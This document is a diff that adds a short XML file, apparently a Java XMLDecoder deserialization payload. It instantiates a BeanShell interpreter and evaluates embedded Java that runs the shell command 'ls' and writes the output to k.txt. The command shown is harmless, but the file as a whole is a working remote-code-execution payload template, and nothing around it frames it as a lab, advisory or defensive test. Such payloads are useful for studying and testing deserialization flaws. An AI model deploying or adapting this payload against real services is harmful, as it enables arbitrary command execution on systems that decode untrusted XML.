@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java>
+    <void class="bsh.Interpreter">
+    <void method="eval">
+                <string>
+                    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec("ls").getInputStream()).useDelimiter("\\A");
+                    String result = s.hasNext() ? s.next() : "";
+                    FileOutputStream fos = new FileOutputStream("k.txt");
+                    fos.write(result.getBytes());
+                    fos.close();
+                </string>
+    </void>
+    </void>
+</java>
